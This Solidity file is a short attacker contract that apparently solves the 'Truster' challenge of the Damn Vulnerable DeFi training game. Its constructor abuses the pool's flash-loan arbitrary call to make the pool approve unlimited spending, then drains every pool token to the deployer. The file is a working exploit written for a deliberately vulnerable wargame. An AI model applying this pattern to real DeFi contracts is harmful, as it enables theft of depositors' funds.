// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function damnValuableToken() external view returns (IERC20);

    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterAttacker {
    constructor (IPool pool) {
        address owner = msg.sender;
        IERC20 token = pool.damnValuableToken();
        pool.flashLoan( // no real loan but pool will approve spending all tokens for this contract
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
        token.transferFrom(address(pool), owner, token.balanceOf(address(pool)));
    }
}
